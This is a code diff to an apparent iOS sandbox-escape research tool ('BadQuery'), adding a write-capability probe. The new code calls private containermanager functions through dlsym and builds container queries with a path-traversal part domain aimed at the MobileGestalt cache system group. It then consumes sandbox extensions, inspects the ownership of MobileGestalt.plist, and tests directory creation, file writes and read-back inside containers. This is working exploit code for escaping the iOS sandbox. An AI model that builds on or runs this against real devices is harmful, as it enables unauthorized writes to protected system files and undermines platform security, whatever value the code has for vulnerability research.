@@ -41,6 +41,7 @@ static NSMutableDictionary *runConfirmedEscape(NSString *name, NSString *path,
                                                uint64_t flags, uint64_t part,
                                                BOOL traversal);
 static NSMutableDictionary *runHandleProbe(void);
+static NSMutableDictionary *runWriteProbe(void);
 
 static NSString *probeRoot(void)
 {
@@ -566,7 +567,44 @@ static NSString *buildTextReport(NSDictionary *report)
         [text appendFormat:@"SHA256Match : %@\n", gestaltWrite[@"SHA256Match"]];
     }
 
-    [text appendString:@"\n--- [6] Full step log ---\n"];
+    NSDictionary *writeProbe = [report[@"WriteProbe"] isKindOfClass:NSDictionary.class]
+        ? report[@"WriteProbe"] : nil;
+    [text appendString:@"\n--- [6] Write capability probe ---\n"];
+    if (!writeProbe) {
+        [text appendString:@"(not run)\n"];
+    } else {
+        [text appendFormat:@"GestaltMode    : %@\n", writeProbe[@"GestaltMode"] ?: @"-"];
+        [text appendFormat:@"GestaltUID/GID : %@/%@\n", writeProbe[@"GestaltUID"] ?: @"-",
+            writeProbe[@"GestaltGID"] ?: @"-"];
+        [text appendFormat:@"OwnContainer   : %@\n", writeProbe[@"OwnContainer"] ?: @"-"];
+        NSDictionary *scope = [writeProbe[@"Scope"] isKindOfClass:NSDictionary.class]
+            ? writeProbe[@"Scope"] : nil;
+        if (scope) {
+            [text appendFormat:@"Handles        : part0=%@ canonical=%@\n",
+                scope[@"HandlePart0"], scope[@"HandleCanonical"]];
+            [text appendFormat:@"Root opendir   : %@ (errno=%@)\n",
+                scope[@"RootOpendir"], scope[@"RootOpendirErrno"]];
+            [text appendFormat:@"Parent opendir : %@ (errno=%@)\n",
+                scope[@"ParentOpendir"], scope[@"ParentOpendirErrno"]];
+            [text appendFormat:@"Documents opendir: %@ (errno=%@)\n",
+                scope[@"DocumentsOpendir"], scope[@"DocumentsOpendirErrno"]];
+            [text appendFormat:@"Mkdir          : %@ (errno=%@)\n",
+                scope[@"Mkdir"], scope[@"MkdirErrno"]];
+            [text appendFormat:@"WriteFile      : %@\n", scope[@"WriteFile"]];
+            [text appendFormat:@"ReadBackVerify : %@\n", scope[@"ReadBackVerified"]];
+        }
+        for (NSString *key in @[@"ActivateFalse", @"ActivateTrue"]) {
+            NSDictionary *variant = [writeProbe[key] isKindOfClass:NSDictionary.class]
+                ? writeProbe[key] : nil;
+            if (!variant) continue;
+            [text appendFormat:@"%@ (flag=%@): status=%@ activated=%@ mkdir=%@ errno=%@ write=%@ readback=%@\n",
+                key, variant[@"ActivateFlag"], variant[@"Status"], variant[@"Activated"],
+                variant[@"Mkdir"], variant[@"MkdirErrno"], variant[@"WriteFile"],
+                variant[@"ReadBackVerified"]];
+        }
+    }
+
+    [text appendString:@"\n--- [7] Full step log ---\n"];
     [text appendString:@"(see BadQuery Probe Log.txt for every step)\n"];
     [text appendString:@"\n============================================================\n"];
     return text;
@@ -684,6 +722,10 @@ static void BadQueryProbeRunInternal(void)
         // Handle semantics: distinct paths must yield distinct handles.
         NSDictionary *handleProbe = runHandleProbe();
 
+        // Write capability: container write test, activate-flag variants,
+        // MobileGestalt owner/mode inspection, extension scope.
+        NSDictionary *writeProbe = runWriteProbe();
+
         // MobileGestalt write verification (only meaningful if read-ok).
         NSMutableDictionary *gestaltWrite = [NSMutableDictionary dictionary];
         NSString *gestaltError = nil;
@@ -730,13 +772,14 @@ static void BadQueryProbeRunInternal(void)
             gestaltPath ? @"complete" : @"path unreachable");
 
         NSDictionary *report = @{
-            @"Version": @5,
+            @"Version": @6,
             @"CreatedAt": NSDate.date,
             @"Environment": environmentInfo(),
             @"Probes": results,
             @"VariantMatrix": matrix,
             @"ConfirmedEscapes": confirmed,
             @"HandleProbe": handleProbe,
+            @"WriteProbe": writeProbe,
             @"GestaltWriteVerify": gestaltWrite,
             @"SacrificeGroupConfigured": @(sacrificeGroupId().length > 0),
         };
@@ -1015,6 +1058,222 @@ static NSMutableDictionary *runHandleProbe(void)
     logStep(dedup, @"handle probe dedup",
         dedup ? @"same path -> same handle (deduplicated)"
               : @"same path -> different handle");
+    return result;
+}
+
+// ---- activate-parameter variant -------------------------------------------
+// The canonical MCM path activates extensions with
+// container_object_sandbox_extension_activate(object, false). Try both
+// flag values and test whether either yields write access inside a real
+// container (mkdir + file write + read back).
+static NSMutableDictionary *runActivateVariant(NSString *containerPath, BOOL activateFlag)
+{
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    result[@"ActivateFlag"] = @(activateFlag);
+    logLine([NSString stringWithFormat:@"==== activate variant flag=%d target=%@",
+        activateFlag, containerPath]);
+
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
+                       RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) {
+        result[@"Status"] = @"failed";
+        result[@"Stage"] = @"dlopen";
+        return result;
+    }
+    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
+    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
+    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
+    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
+    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
+    void (*query_set_part_domain)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
+    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
+    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
+    void *(*object_copy)(void *) = dlsym(mgr, "container_object_copy");
+    void (*object_free)(void *) = dlsym(mgr, "container_object_free");
+    BOOL (*object_activate)(void *, BOOL) =
+        (BOOL (*)(void *, BOOL))dlsym(mgr, "container_object_sandbox_extension_activate");
+    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
+        !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free ||
+        !object_copy || !object_free || !object_activate) {
+        dlclose(mgr);
+        result[@"Status"] = @"failed";
+        result[@"Stage"] = @"dlsym";
+        return result;
+    }
+
+    void *query = query_create();
+    if (!query) {
+        dlclose(mgr);
+        result[@"Status"] = @"failed";
+        result[@"Stage"] = @"query_create";
+        return result;
+    }
+    query_set_class(query, 13);
+    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
+    query_set_group_identifiers(query, identifier);
+    query_set_part(query, 3); // canonical part: proven for concrete container paths
+    NSString *traversalPath =
+        [NSString stringWithFormat:@"../../../../../../../..%@", containerPath];
+    query_set_part_domain(query, traversalPath.UTF8String);
+    query_set_flags(query, 0x900000000ULL);
+
+    void *queryResult = query_get_single_result(query);
+    if (!queryResult) {
+        query_free(query);
+        dlclose(mgr);
+        result[@"Status"] = @"denied";
+        result[@"Stage"] = @"get_single_result";
+        logStep(NO, @"activate variant query", @"NULL");
+        return result;
+    }
+    void *object = object_copy(queryResult);
+    if (!object) {
+        query_free(query);
+        dlclose(mgr);
+        result[@"Status"] = @"failed";
+        result[@"Stage"] = @"object_copy";
+        return result;
+    }
+    BOOL activated = object_activate(object, activateFlag);
+    result[@"Activated"] = @(activated);
+    logStep(activated, @"activate",
+        [NSString stringWithFormat:@"flag=%d -> %@", activateFlag, activated ? @"YES" : @"NO"]);
+
+    // Write capability test inside the container.
+    NSString *testDir = [containerPath stringByAppendingPathComponent:
+        [NSString stringWithFormat:@"FFWriteTest-%d-%d", getpid(), (int)activateFlag]];
+    errno = 0;
+    BOOL mkdirOk = mkdir(testDir.UTF8String, 0700) == 0;
+    result[@"Mkdir"] = @(mkdirOk);
+    result[@"MkdirErrno"] = @(mkdirOk ? 0 : errno);
+    logStep(mkdirOk, @"activate variant mkdir",
+        mkdirOk ? @"created" : [NSString stringWithFormat:@"errno=%d", errno]);
+    if (mkdirOk) {
+        NSString *file = [testDir stringByAppendingPathComponent:@"probe.txt"];
+        NSData *payload = [@"FuckFileWriteProbe\n" dataUsingEncoding:NSUTF8StringEncoding];
+        BOOL wrote = [payload writeToFile:file atomically:YES];
+        result[@"WriteFile"] = @(wrote);
+        logStep(wrote, @"activate variant write", wrote ? @"written" : @"failed");
+        NSData *back = [NSData dataWithContentsOfFile:file];
+        BOOL verified = wrote && [back isEqualToData:payload];
+        result[@"ReadBackVerified"] = @(verified);
+        logStep(verified, @"activate variant read-back", verified ? @"verified" : @"failed");
+        [[NSFileManager defaultManager] removeItemAtPath:file error:nil];
+        rmdir(testDir.UTF8String);
+    }
+    result[@"Status"] = mkdirOk ? @"writable" : @"readonly";
+
+    object_free(object);
+    query_free(query);
+    dlclose(mgr);
+    return result;
+}
+
+// ---- write capability probe -----------------------------------------------
+// 1) Owner/mode inspection of MobileGestalt.plist (DAC wall check).
+// 2) Extension scope: what the container extension actually covers
+//    (root readable, parent denied, children readable).
+// 3) Real write test inside our own container (canonical + matrix handles).
+// 4) container_object_sandbox_extension_activate flag=true vs false.
+static NSMutableDictionary *runWriteProbe(void)
+{
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    logLine(@"==== write capability probe ====");
+
+    // 1) MobileGestalt.plist owner / mode (DAC wall).
+    NSString *gestaltPath = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist";
+    struct stat gs = {0};
+    if (lstat(gestaltPath.UTF8String, &gs) == 0) {
+        result[@"GestaltMode"] = [NSString stringWithFormat:@"%04o", gs.st_mode & 07777];
+        result[@"GestaltUID"] = @(gs.st_uid);
+        result[@"GestaltGID"] = @(gs.st_gid);
+        result[@"GestaltWritableByUs"] = @((gs.st_mode & 0222) != 0);
+        logStep(YES, @"gestalt owner/mode",
+            [NSString stringWithFormat:@"mode=%04o uid=%u gid=%u (any-write-bit=%d)",
+                gs.st_mode & 07777, gs.st_uid, gs.st_gid, (gs.st_mode & 0222) != 0]);
+    } else {
+        result[@"GestaltLstatErrno"] = @(errno);
+    }
+
+    // 2) Our own container: extension scope + write test.
+    NSString *error = nil;
+    NSString *ownContainer = [[MCMManager sharedManager]
+        dataContainerPathForIdentifier:@"com.apple.mobile.MobileHouseArrest" error:&error];
+    result[@"OwnContainer"] = ownContainer ?: (error ?: @"unreachable");
+    if (ownContainer) {
+        NSMutableDictionary *scope = [NSMutableDictionary dictionary];
+
+        // Extension scope: root / parent / child readability.
+        int64_t h0 = BadQueryConsumeCombo(ownContainer,
+            @"systemgroup.com.apple.mobilegestaltcache", 0x900000000ULL, 0, YES);
+        scope[@"HandlePart0"] = @(h0);
+        char *pc = strdup(ownContainer.UTF8String);
+        int64_t hc = pc ? bad_query(pc, false, NULL, false) : -255;
+        free(pc);
+        scope[@"HandleCanonical"] = @(hc);
+        logStep(h0 >= 0 || hc >= 0, @"own container consume",
+            [NSString stringWithFormat:@"part0=%lld canonical=%lld", h0, hc]);
+
+        if (h0 >= 0 || hc >= 0) {
+            errno = 0;
+            DIR *d = opendir(ownContainer.UTF8String);
+            scope[@"RootOpendir"] = @(d != NULL);
+            scope[@"RootOpendirErrno"] = @(d ? 0 : errno);
+            logStep(d != NULL, @"scope: container root opendir",
+                d ? @"ok" : [NSString stringWithFormat:@"errno=%d", errno]);
+            if (d) closedir(d);
+
+            NSString *parent = ownContainer.stringByDeletingLastPathComponent;
+            errno = 0;
+            DIR *dp = opendir(parent.UTF8String);
+            scope[@"ParentOpendir"] = @(dp != NULL);
+            scope[@"ParentOpendirErrno"] = @(dp ? 0 : errno);
+            logStep(dp != NULL, @"scope: parent opendir",
+                dp ? @"ok (scope overflows!)" : [NSString stringWithFormat:@"denied errno=%d (expected)", errno]);
+            if (dp) closedir(dp);
+
+            NSString *docs = [ownContainer stringByAppendingPathComponent:@"Documents"];
+            errno = 0;
+            DIR *dd = opendir(docs.UTF8String);
+            scope[@"DocumentsOpendir"] = @(dd != NULL);
+            scope[@"DocumentsOpendirErrno"] = @(dd ? 0 : errno);
+            logStep(dd != NULL, @"scope: Documents opendir",
+                dd ? @"ok" : [NSString stringWithFormat:@"errno=%d", errno]);
+            if (dd) closedir(dd);
+
+            // Write test in Documents.
+            NSString *testDir = [docs stringByAppendingPathComponent:
+                [NSString stringWithFormat:@"FFWriteTest-%d", getpid()]];
+            errno = 0;
+            BOOL mkdirOk = mkdir(testDir.UTF8String, 0700) == 0;
+            scope[@"Mkdir"] = @(mkdirOk);
+            scope[@"MkdirErrno"] = @(mkdirOk ? 0 : errno);
+            logStep(mkdirOk, @"write: mkdir in Documents",
+                mkdirOk ? @"created" : [NSString stringWithFormat:@"errno=%d", errno]);
+            if (mkdirOk) {
+                NSString *file = [testDir stringByAppendingPathComponent:@"probe.txt"];
+                NSData *payload = [@"FuckFileWriteProbe\n" dataUsingEncoding:NSUTF8StringEncoding];
+                BOOL wrote = [payload writeToFile:file atomically:YES];
+                scope[@"WriteFile"] = @(wrote);
+                logStep(wrote, @"write: file", wrote ? @"written" : @"failed");
+                NSData *back = [NSData dataWithContentsOfFile:file];
+                BOOL verified = wrote && [back isEqualToData:payload];
+                scope[@"ReadBackVerified"] = @(verified);
+                logStep(verified, @"write: read-back", verified ? @"verified" : @"failed");
+                [[NSFileManager defaultManager] removeItemAtPath:file error:nil];
+                rmdir(testDir.UTF8String);
+            }
+        }
+        result[@"Scope"] = scope;
+    }
+
+    // 3) Activate-parameter variants (flag true vs false).
+    if (ownContainer) {
+        result[@"ActivateFalse"] = runActivateVariant(ownContainer, NO);
+        result[@"ActivateTrue"] = runActivateVariant(ownContainer, YES);
+    }
+
+    logLine(@"==== write capability probe done ====");
     return result;
 }
 
